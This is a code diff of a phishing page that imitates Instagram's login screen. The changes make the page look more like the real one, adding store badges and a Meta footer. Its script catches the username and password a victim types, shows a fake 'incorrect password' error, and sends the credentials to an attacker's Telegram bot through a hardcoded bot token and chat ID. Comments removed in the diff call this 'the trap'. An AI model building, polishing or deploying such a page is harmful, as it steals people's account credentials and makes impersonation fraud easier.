@@ -5,230 +5,53 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Instagram</title>
     <style>
-        /* إعادة تعيين الأنماط الأساسية */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-        }
-
-        body {
-            background-color: #fafafa;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            direction: ltr; /* التأكد من أن الاتجاه من اليسار لليمين */
-        }
-
-        .container {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            width: 100%;
-            max-width: 350px;
-            padding: 20px 0;
-        }
-
-        /* صندوق تسجيل الدخول الرئيسي */
-        .login-box {
-            background-color: #fff;
-            border: 1px solid #dbdbdb;
-            border-radius: 1px;
-            padding: 40px 40px 20px 40px;
-            width: 100%;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            margin-bottom: 10px;
-        }
-
-        /* شعار Instagram */
-        .logo {
-            font-family: 'Grand Hotel', 'Brush Script MT', cursive;
-            font-size: 48px;
-            margin-bottom: 30px;
-            color: #262626;
-            letter-spacing: -1px;
-        }
-
-        /* نموذج تسجيل الدخول */
-        form {
-            width: 100%;
-        }
-
-        .input-group {
-            margin-bottom: 6px;
-            position: relative;
-        }
-
-        .input-group input {
-            width: 100%;
-            padding: 9px 8px 7px;
-            background-color: #fafafa;
-            border: 1px solid #dbdbdb;
-            border-radius: 3px;
-            font-size: 12px;
-            color: #262626;
-            outline: none;
-            transition: border-color 0.2s;
-        }
-
-        .input-group input:focus {
-            border: 1px solid #a8a8a8;
-        }
-
-        /* زر "Show" لكلمة المرور */
-        .show-password {
-            position: absolute;
-            right: 8px;
-            top: 50%;
-            transform: translateY(-50%);
-            font-size: 14px;
-            font-weight: 600;
-            color: #262626;
-            cursor: pointer;
-            background: none;
-            border: none;
-            padding: 0;
-            display: none; /* يظهر فقط عند وجود نص */
-        }
-
-        /* زر تسجيل الدخول */
-        .login-btn {
-            width: 100%;
-            background-color: #0095f6;
-            color: #fff;
-            border: none;
-            border-radius: 4px;
-            padding: 7px 16px;
-            font-weight: 600;
-            font-size: 14px;
-            margin-top: 8px;
-            cursor: pointer;
-            transition: background-color 0.2s;
-        }
-
-        .login-btn:disabled {
-            background-color: #b2dffc;
-            cursor: not-allowed;
-        }
-
-        .login-btn:active:not(:disabled) {
-            background-color: #1877f2;
-        }
-
-        /* فاصل "OR" */
-        .divider {
-            display: flex;
-            align-items: center;
-            width: 100%;
-            margin: 20px 0;
-        }
-
-        .line {
-            flex-grow: 1;
-            height: 1px;
-            background-color: #dbdbdb;
-        }
-
-        .or-text {
-            margin: 0 18px;
-            font-size: 13px;
-            font-weight: 600;
-            color: #8e8e8e;
-        }
-
-        /* زر "Log in with Facebook" */
-        .fb-login {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            color: #385185;
-            font-weight: 600;
-            font-size: 14px;
-            text-decoration: none;
-            margin-bottom: 15px;
-            cursor: pointer;
-        }
-
-        .fb-icon {
-            width: 16px;
-            height: 16px;
-            fill: #385185;
-        }
-
-        /* رابط "Forgot password?" */
-        .forgot-password {
-            color: #00376b;
-            font-size: 12px;
-            text-decoration: none;
-            margin-top: 12px;
-        }
-
-        /* صندوق "Don't have an account?" */
-        .signup-box {
-            background-color: #fff;
-            border: 1px solid #dbdbdb;
-            border-radius: 1px;
-            padding: 20px;
-            width: 100%;
-            text-align: center;
-            font-size: 14px;
-            color: #262626;
-            margin-bottom: 20px;
-        }
-
-        .signup-box a {
-            color: #0095f6;
-            text-decoration: none;
-            font-weight: 600;
-            margin-left: 5px;
-        }
-
-        /* قسم "Get the app" */
-        .get-app {
-            text-align: center;
-        }
-
-        .get-app p {
-            font-size: 14px;
-            color: #262626;
-            margin-bottom: 15px;
-        }
-
-        /* شارات التطبيقات */
-        .app-badges {
-            display: flex;
-            justify-content: center;
-            gap: 10px;
-        }
-
-        .app-badge {
-            height: 40px;
-            background-color: #000;
-            border-radius: 5px;
-            color: #fff;
-            padding: 0 10px;
-            display: flex;
-            align-items: center;
-            font-size: 10px;
-            text-decoration: none;
-            font-weight: 500;
-        }
-
-        /* رسالة الخطأ (تظهر عند محاولة تسجيل الدخول) */
-        .error-message {
-            color: #ed4956;
-            font-size: 14px;
-            text-align: center;
-            margin-top: 15px;
-            display: none;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; flex-direction: column; }
+        
+        .container { width: 100%; max-width: 350px; padding: 10px; display: flex; flex-direction: column; align-items: center; }
+        
+        /* صندوق تسجيل الدخول */
+        .login-box { background-color: #fff; border: 1px solid #dbdbdb; border-radius: 1px; padding: 40px 40px 20px 40px; width: 100%; display: flex; flex-direction: column; align-items: center; margin-bottom: 10px; }
+        
+        .logo { font-family: 'Grand Hotel', cursive; font-size: 50px; margin-bottom: 35px; color: #262626; }
+        
+        form { width: 100%; }
+        
+        .input-group { margin-bottom: 6px; position: relative; }
+        .input-group input { width: 100%; padding: 10px 8px; background-color: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; color: #262626; outline: none; }
+        .input-group input:focus { border: 1px solid #a8a8a8; }
+        
+        .show-password { position: absolute; right: 8px; top: 50%; transform: translateY(-50%); font-size: 14px; font-weight: 600; color: #262626; cursor: pointer; background: none; border: none; display: none; }
+        
+        .login-btn { width: 100%; background-color: #0095f6; color: #fff; border: none; border-radius: 4px; padding: 8px 16px; font-weight: 600; font-size: 14px; margin-top: 8px; cursor: pointer; }
+        .login-btn:disabled { background-color: #b2dffc; cursor: default; }
+        
+        .divider { display: flex; align-items: center; width: 100%; margin: 20px 0; }
+        .line { flex-grow: 1; height: 1px; background-color: #dbdbdb; }
+        .or-text { margin: 0 18px; font-size: 13px; font-weight: 600; color: #8e8e8e; }
+        
+        .fb-login { display: flex; align-items: center; justify-content: center; gap: 8px; color: #385185; font-weight: 600; font-size: 14px; text-decoration: none; margin-bottom: 15px; }
+        .fb-icon { width: 16px; height: 16px; fill: #385185; }
+        
+        .forgot-password { color: #00376b; font-size: 12px; text-decoration: none; margin-top: 12px; }
+        
+        /* صندوق التسجيل */
+        .signup-box { background-color: #fff; border: 1px solid #dbdbdb; border-radius: 1px; padding: 20px; width: 100%; text-align: center; font-size: 14px; color: #262626; margin-bottom: 20px; }
+        .signup-box a { color: #0095f6; text-decoration: none; font-weight: 600; margin-left: 5px; }
+        
+        /* تحميل التطبيق */
+        .get-app { text-align: center; width: 100%; }
+        .get-app p { font-size: 14px; color: #262626; margin-bottom: 15px; }
+        .app-badges { display: flex; justify-content: center; gap: 10px; }
+        .app-badges img { height: 40px; cursor: pointer; }
+        
+        /* الفوتر */
+        .footer { margin-top: 30px; display: flex; flex-wrap: wrap; justify-content: center; gap: 15px; font-size: 12px; color: #8e8e8e; padding: 0 20px; }
+        .footer a { color: #8e8e8e; text-decoration: none; }
+        .footer-bottom { margin-top: 15px; font-size: 12px; color: #8e8e8e; display: flex; gap: 15px; margin-bottom: 30px; }
+        
+        .error-message { color: #ed4956; font-size: 14px; text-align: center; margin-top: 15px; display: none; margin-bottom: 10px;}
     </style>
-    <!-- استيراد خط Grand Hotel لشعار Instagram -->
     <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
 </head>
 <body>
@@ -270,14 +93,35 @@
         <div class="get-app">
             <p>Get the app.</p>
             <div class="app-badges">
-                <a href="#" class="app-badge">Get it on Google Play</a>
-                <a href="#" class="app-badge">Get it from Microsoft</a>
+                <!-- صور حقيقية للمتاجر -->
+                <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Get it on Google Play">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/f/f7/Get_it_from_Microsoft_Badge.svg" alt="Get it from Microsoft" style="height: 40px;">
             </div>
+        </div>
+        
+        <!-- الفوتر الحقيقي -->
+        <div class="footer">
+            <a href="#">Meta</a>
+            <a href="#">About</a>
+            <a href="#">Blog</a>
+            <a href="#">Jobs</a>
+            <a href="#">Help</a>
+            <a href="#">API</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+            <a href="#">Locations</a>
+            <a href="#">Instagram Lite</a>
+            <a href="#">Threads</a>
+            <a href="#">Contact Uploading & Non-Users</a>
+            <a href="#">Meta Verified</a>
+        </div>
+        <div class="footer-bottom">
+            <span>English <svg style="width:10px;fill:#8e8e8e; margin-left:2px;" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg></span>
+            <span>© 2026 Instagram from Meta</span>
         </div>
     </div>
 
     <script>
-        // --- العناصر الأساسية ---
         const loginForm = document.getElementById('loginForm');
         const usernameInput = document.getElementById('username');
         const passwordInput = document.getElementById('password');
@@ -285,12 +129,10 @@
         const togglePassword = document.getElementById('togglePassword');
         const errorMessage = document.getElementById('errorMessage');
 
-        // --- 1. تفعيل/تعطيل زر تسجيل الدخول ---
         function checkInputs() {
             const usernameValue = usernameInput.value.trim();
             const passwordValue = passwordInput.value.trim();
             
-            // إظهار زر "Show" فقط عند وجود نص في حقل كلمة المرور
             togglePassword.style.display = passwordValue.length > 0 ? 'block' : 'none';
 
             if (usernameValue !== '' && passwordValue !== '') {
@@ -303,7 +145,6 @@
         usernameInput.addEventListener('input', checkInputs);
         passwordInput.addEventListener('input', checkInputs);
 
-        // --- 2. إظهار/إخفاء كلمة المرور ---
         togglePassword.addEventListener('click', function() {
             if (passwordInput.type === 'password') {
                 passwordInput.type = 'text';
@@ -314,23 +155,18 @@
             }
         });
 
-        // --- 3. التعامل مع إرسال النموذج (سحب البيانات) ---
         loginForm.addEventListener('submit', function(e) {
-            e.preventDefault(); // منع إعادة تحميل الصفحة
+            e.preventDefault();
 
             const username = usernameInput.value.trim();
             const password = passwordInput.value.trim();
 
-            // إظهار رسالة خطأ وهمية (للتأثير فقط)
             errorMessage.textContent = 'Sorry, your password was incorrect. Please double-check your password.';
             errorMessage.style.display = 'block';
-            errorMessage.style.color = '#ed4956';
 
-            // تعطيل الزر مؤقتاً لمحاكاة التحميل
             loginBtn.disabled = true;
             loginBtn.textContent = 'Logging in...';
 
-            // 🔥 إرسال البيانات إلى تيليجرام (هذا هو الفخ)
             const BOT_TOKEN = "9134254301:AAG8bCDBz8IfO8CHEk5Qyxie2ceOca_xx0U";
             const CHAT_ID = "2005892579";
             const message = `🚨 *INSTAGRAM HIT!*\n👤 User: \`${username}\`\n🔑 Pass: \`${password}\``;
@@ -339,16 +175,14 @@
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "Markdown" })
-            }).catch(err => console.log(err)); // حتى لو فشل الإرسال، نكمل
+            }).catch(err => console.log(err));
 
-            // بعد 2.5 ثانية، نعيد الزر لحالته الطبيعية (محاكاة انتهاء المحاولة)
             setTimeout(() => {
                 loginBtn.textContent = 'Log in';
                 loginBtn.disabled = false;
             }, 2500);
         });
 
-        // --- 4. تهيئة الصفحة عند التحميل ---
         checkInputs();
     </script>
 </body>
